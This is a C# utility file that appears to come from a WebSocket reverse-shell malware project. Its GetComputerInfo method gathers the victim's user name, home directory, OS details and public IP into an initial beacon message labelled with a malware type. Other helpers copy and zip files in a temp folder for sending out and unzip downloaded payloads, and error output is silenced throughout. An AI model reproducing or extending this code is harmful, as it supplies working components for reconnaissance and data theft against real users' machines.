using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;

namespace WebSocketReverseShellDotNet.utils
{
    internal static class OSUtil
    {
        public static ReverseShellInfoInitialMessage GetComputerInfo()
        {
            return new ReverseShellInfoInitialMessageBuilder()
                .WithuserName(Environment.UserName)
                .WithuserLanguage(System.Globalization.CultureInfo.CurrentCulture.Name)
                .WithuserCurrentWorkingDir(Environment.CurrentDirectory)
                .WithuserHome(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
                .WithosName(System.Runtime.InteropServices.RuntimeInformation.OSDescription)
                .WithosArch(System.Runtime.InteropServices.RuntimeInformation.OSArchitecture.ToString())
                .WithosVersion(Environment.OSVersion.ToString)
                .WithuserPublicIp(GetPublicIp())
                .WithmalwareType("C#")
                .Withreply("Success") // Assuming a default reply
                .Build();
        }

        static string GetPublicIp()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage response = client.GetAsync("https://httpbin.org/ip").Result;

                    if (response.IsSuccessStatusCode)
                    {
                        string json = response.Content.ReadAsStringAsync().Result;

                        // Deserialize JSON response to PublicIpJsonModel
                        PublicIpJsonModel publicIpJsonModel = Newtonsoft.Json.JsonConvert.DeserializeObject<PublicIpJsonModel>(json);

                        if (publicIpJsonModel != null && publicIpJsonModel.Origin != null)
                        {
                            return publicIpJsonModel.Origin;
                        }
                        else
                        {
                            return json; // Return the raw JSON response if the deserialization fails
                        }
                    }
                    else
                    {
                        return string.Empty;
                    }
                }
            }
            catch (Exception e)
            {
               /* Console.WriteLine(e.ToString());*/
                return string.Empty;
            }
        }

        public static string GetSystemTempDir()
        {
            return Path.GetTempPath();
        }


 

        public static void RunInSeparateThread(Func<Task> function)
        {
            Thread thread = new Thread(async () =>
            {
                try
                {
                    await function.Invoke();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            });

            thread.Start();
        }


        public static void Sleep(int milliSeconds)
        {
            try
            {
                Thread.Sleep(milliSeconds);
            }
            catch (Exception ex)
            {
                /*Console.WriteLine(ex.ToString());*/
            }
        }

        public static DirectoryInfo CreateDirectoryInTmpFolder(string dir)
        {
            string tmpDirectory = Path.Combine(GetSystemTempDir(), dir);
            Directory.CreateDirectory(tmpDirectory);

            return new DirectoryInfo(tmpDirectory);
        }



        // refactor later
        public static string Unzip(string zipFilePath, string destDirectory)
        {
            try
            {
                // Create the destination directory if it doesn't exist
                Directory.CreateDirectory(destDirectory);

                // Extract all entries from the ZIP file
                ZipFile.ExtractToDirectory(zipFilePath, destDirectory);
                
                // Get the extracted files
                string[] extractedFiles = Directory.GetFiles(destDirectory);

                // Check if there is exactly one file in the extracted directory
                if (extractedFiles.Length != 1)
                {
                    throw new IOException("Expected one file in the ZIP archive, found: " + extractedFiles.Length);
                }

                /*Console.WriteLine("Unzip completed successfully.");*/
                return extractedFiles[0];
            }
            catch (IOException e)
            {
                /*Console.Error.WriteLine("Failed to unzip the file: " + zipFilePath);*/
                throw e; // Rethrow the exception to indicate the failure
            }
        }

        public static bool FileExists(string path)
        {
            // Expand environment variables in the path
            string expandedPath = Environment.ExpandEnvironmentVariables(path);

            // Check if the expanded path represents an existing file
            return File.Exists(expandedPath);
        }

        public static bool DirectoryExists(string path)
        {
            // Expand environment variables in the path
            string expandedPath = Environment.ExpandEnvironmentVariables(path);

            // Check if the expanded path represents an existing file
            return Directory.Exists(expandedPath);
        }

        public static string CopyFileWithNumberPreAppended(string sourcePath, string destinationDirectory, int fileNumber)
        {

 
            if (FileExists(sourcePath))
            {
                string fileName = Path.GetFileName(sourcePath);
                string newFileName = $"{fileNumber}_{fileName}";
                string destinationPath = Path.Combine(destinationDirectory, newFileName);
                try
                {
                    if (File.Exists(destinationPath) )
                    {
                        File.Delete(destinationPath);

                    }


                    // Move the file to the new directory
                    File.Copy(Environment.ExpandEnvironmentVariables(sourcePath), destinationPath);

                    return destinationPath;
                }
                catch (Exception ex)
                {
                    /*Console.WriteLine(($"Error moving file: {ex.Message}"));*/
                    return "";
                }
            }
            else
            {
                /*Console.WriteLine(($"The file '{sourcePath}' does not exist."));*/
                return  "";
            }
        }

        public static FileInfo? ZipFiles(List<string> files, string outputDirectory, string zipFileName)
        {
            try
            {
                // Ensure the output directory exists
                if (!Directory.Exists(outputDirectory))
                {
                    Directory.CreateDirectory(outputDirectory);
                }

                // Combine the output directory and zip file name to get the full path
                string outputPath = Path.Combine(outputDirectory, zipFileName);

                // Check if the file already exists
                if (File.Exists(outputPath))
                {
                    File.Delete(outputPath); // Delete the existing file
                }

                // Create a new zip file
                using (ZipArchive zipArchive = ZipFile.Open(outputPath, ZipArchiveMode.Update))
                {
                    foreach (string filePath in files)
                    {
                        // Ensure the file exists before adding it to the zip archive
                        if (File.Exists(filePath))
                        {
                            // Create an entry in the zip archive for the file
                            zipArchive.CreateEntryFromFile(filePath, Path.GetFileName(filePath));
                        }
                        else
                        {
                            /*Console.WriteLine($"File not found: {filePath}");*/
                        }
                        if (zipArchive.Entries.Count == 0) return null;
                    }
                }


                // Return FileInfo for the created zip file
                return new FileInfo(outputPath);
            }
            catch (Exception ex)
            {
                // Handle any exceptions that may occur during zipping
               /* Console.WriteLine($"Error zipping files: {ex.Message}");*/
                return null;
            }
        }

       /* static FileInfo? ZipFiles(List<string> files, string outputDirectory, string zipFileName)
    {
        try
        {
            // Ensure the output directory exists
            if (!Directory.Exists(outputDirectory))
            {
                Directory.CreateDirectory(outputDirectory);
            }

            // Combine the output directory and zip file name to get the full path
            string outputPath = Path.Combine(outputDirectory, zipFileName);

            // Check if the file already exists
            if (File.Exists(outputPath))
            {
                // Make sure the file is not in use before attempting to delete it
                File.Delete(outputPath); // Delete the existing file
            }

            // Use ZipFile.ExtractToDirectory to create a new zip file
            ZipFile.CreateFromDirectory(outputDirectory, outputPath);

            // Return FileInfo for the created zip file
            return new FileInfo(outputPath);
        }
        catch (Exception ex)
        {
            // Handle any exceptions that may occur during zipping
            Console.WriteLine($"Error zipping files: {ex.Message}");
            return null;
        }
    }*/








    }
}
